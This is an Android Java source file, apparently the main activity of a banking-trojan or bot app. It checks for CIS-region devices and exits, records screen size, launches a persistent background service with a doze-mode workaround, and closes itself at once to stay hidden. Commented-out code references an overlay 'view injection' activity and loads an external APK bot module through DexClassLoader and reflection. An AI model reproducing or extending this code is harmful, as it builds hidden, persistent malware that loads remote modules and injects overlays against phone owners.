package com.example.mmm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Point;
import android.os.Bundle;
import android.util.Log;

//import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.Service.srvWhileWorker;
import com.example.mmm.Utils.idUtils;
import com.example.mmm.Utils.utils;

public class mainActivity extends Activity {

    utils utl = new utils();
    idUtils idutl = new idUtils();
    constants consts = new constants();
    private String TAG_LOG  = mainActivity.class.getSimpleName()+ consts.strTAG1;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if(utl.blockCIS(this)){
            return;
        }

        Point size = new Point();
        getWindowManager().getDefaultDisplay().getSize(size);
        utl.SettingsWrite(this, consts.display_width, consts.str_null + size.x);
        utl.SettingsWrite(this, consts.display_height,  consts.str_null + size.y);

        try{
            String str = utl.SettingsRead(this, consts.initialization);//Check initialization if error then do it!
            if(str.contains(consts.str_good)) {
                      utl.Log(TAG_LOG, consts.string_137);
                      utl.initialization2(this);
            }
        }catch (Exception ex){
                 utl.Log(TAG_LOG,consts.string_136);
            utl.initialization(this);
        }
        utl.startCustomTimer(this, consts.str_null, 10000);




        try {
            if (!utl.isMyServiceRunning(this, srvWhileWorker.class)) {
                startService(new Intent(this, srvWhileWorker.class));
            }
        }catch (Exception ex) {
            if (!idutl.is_dozemode(this)) {
                utl.start_dozemode("run_king_service", this);
            }

        }
            finish();


/*
        try {
            startActivity(new Intent(this, Class.forName("com.example.mmm.Activity.actViewInjection")));
        }catch (Exception e){
            utl.Log(TAG_LOG,"ERROR START ACTIVITY");
        }
*/

       // startRecursion("com.example.mmm.jis");
      //  String ss = startDex(this, "worker!!!");

      //  utl.Log(TAG_LOG, "SS: " +ss);
//        runMethod(this, "com.example.mmm.mainActivity","startDex", "1;;2;;3;;4");
    }
/*
    public void runMethod(Context context, String sClass, String sMethod, String params){
        try {
            Class c = Class.forName(sClass);
            Method m = c.getMethod(sMethod, Context.class, String.class);
            m.invoke(c.newInstance(),context, params);
        } catch (Throwable t) {
            utl.Log(TAG_LOG,"Error Recursion");
        }
    }

    public String startDex(Context context, String params){
        try {
            // File file = new File(service.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
             String libPath = "/storage/emulated/0/1.apk";
             File tmpDir = context.getDir("outdex", 0);
             DexClassLoader classloader = new DexClassLoader(libPath, tmpDir.getAbsolutePath(), null,getClass().getClassLoader());
             Class classToLoad =  classloader.loadClass("com.example.modulebot.test");
             Method method = classToLoad.getMethod("str1", String.class);
             return method.invoke(classToLoad.newInstance(), params).toString();
        }catch(Exception e){
            utl.Log(TAG_LOG,"DexError: "+ e.toString());
        }
        return "QQQ";
    }
*/
/*
    public  String LoadLibNotification( Context service, String title, String text){
        try {
            String nameMethod = "showNotificationAPI16";

            File file = new File(service.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = service.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod(nameMethod, Context.class, String.class, String.class);
           return doSomething.invoke(myInstance, service, title, text);
        }catch(Exception e){
            Log.e("DexNotification",e.toString());
        }
        Log.e("Module","DexNotification");
    }*/
}
